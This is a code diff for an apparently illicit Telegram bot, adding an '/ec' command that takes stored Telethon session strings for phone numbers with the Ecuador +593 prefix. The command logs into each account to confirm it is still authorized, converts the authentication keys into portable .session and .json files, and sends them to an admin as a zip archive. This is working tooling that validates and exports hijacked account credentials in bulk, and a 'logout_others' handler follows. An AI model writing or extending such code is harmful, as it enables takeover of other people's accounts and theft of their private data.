@@ -332,6 +332,130 @@ async def cmd_itim(message: types.Message):
             logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")
 
 
+@dp.message_handler(commands=['ec'])
+async def cmd_ec(message: types.Message):
+    user_id = message.from_user.id
+    
+    if not (is_main_admin(user_id) or is_light_admin(user_id)):
+        await message.answer("❌ You don't have access to this command.")
+        return
+    
+    await message.answer("🔍 Searching for valid Ecuadorian (+593) sessions...")
+    
+    # Получаем все сессии из нужной коллекции
+    if is_main_admin(user_id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": user_id}))
+    
+    if not sessions:
+        await message.answer("❌ No sessions found in database.")
+        return
+    
+    # Фильтруем только эквадорские (+593)
+    ecuador_sessions = [s for s in sessions if s["phone"].startswith("+593")]
+    
+    if not ecuador_sessions:
+        await message.answer("❌ No Ecuadorian (+593) sessions found.")
+        return
+    
+    await message.answer(f"🇪🇨 Found {len(ecuador_sessions)} Ecuadorian sessions. Checking validity...")
+    
+    temp_dir = tempfile.mkdtemp()
+    zip_path = os.path.join(temp_dir, f"ecuador_sessions_export_{user_id}.zip")
+    valid_count = 0
+    
+    try:
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for i, session in enumerate(ecuador_sessions, 1):
+                client = None
+                try:
+                    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+                    await client.connect()
+                    
+                    if await client.is_user_authorized():
+                        me = await client.get_me()
+                        phone = session["phone"].replace("+", "")
+                        
+                        # Генерируем данные сессии (как в экспорте)
+                        session_data = await generate_full_session_data(session, client, me)
+                        
+                        # Сохраняем JSON
+                        json_filename = f"{phone}.json"
+                        json_path = os.path.join(temp_dir, json_filename)
+                        with open(json_path, 'w', encoding='utf-8') as f:
+                            json.dump(session_data, f, indent=2, ensure_ascii=False)
+                        zipf.write(json_path, json_filename)
+                        
+                        # Конвертируем в SQLite и добавляем в архив
+                        session_obj = StringSession(session["session"])
+                        session_file = os.path.join(temp_dir, f"{phone}.session")
+                        
+                        sqlite_session = SQLiteSession(session_file)
+                        sqlite_session.set_dc(
+                            session_obj.dc_id, 
+                            session_obj.server_address, 
+                            session_obj.port
+                        )
+                        sqlite_session.auth_key = session_obj.auth_key
+                        sqlite_session.save()
+                        
+                        zipf.write(session_file, f"{phone}.session")
+                        
+                        valid_count += 1
+                        
+                        # Удаляем временные файлы
+                        os.unlink(json_path)
+                        os.unlink(session_file)
+                        
+                        # Прогресс каждые 5 сессий
+                        if i % 5 == 0:
+                            await message.answer(
+                                f"⏳ Processed {i}/{len(ecuador_sessions)}\n"
+                                f"✅ Valid: {valid_count}"
+                            )
+                    
+                except Exception as e:
+                    logging.error(f"Error checking session {session.get('phone')}: {str(e)}")
+                finally:
+                    if client:
+                        await client.disconnect()
+        
+        if valid_count == 0:
+            await message.answer("❌ No valid Ecuadorian sessions found.")
+            return
+        
+        # Отправляем архив пользователю
+        with open(zip_path, 'rb') as zip_file:
+            await bot.send_document(
+                chat_id=user_id,
+                document=zip_file,
+                caption=f"🇪🇨 Ecuadorian Sessions Export\n"
+                       f"• Total checked: {len(ecuador_sessions)}\n"
+                       f"• Valid sessions: {valid_count}\n\n"
+                       f"Format:\n"
+                       f"- [phone].json — session info\n"
+                       f"- [phone].session — SQLite session file",
+                reply_to_message_id=message.message_id
+            )
+        
+    except Exception as e:
+        await message.answer(f"❌ Export failed: {str(e)}")
+    finally:
+        # Удаляем временные файлы
+        for filename in os.listdir(temp_dir):
+            file_path = os.path.join(temp_dir, filename)
+            try:
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+            except Exception as e:
+                logging.error(f"Failed to delete {file_path}: {str(e)}")
+        
+        try:
+            os.rmdir(temp_dir)
+        except OSError as e:
+            logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")
+
 # Добавьте этот обработчик в раздел COMMAND HANDLERS
 @dp.message_handler(commands=['logout_others'])
 async def cmd_logout_other_sessions(message: types.Message):
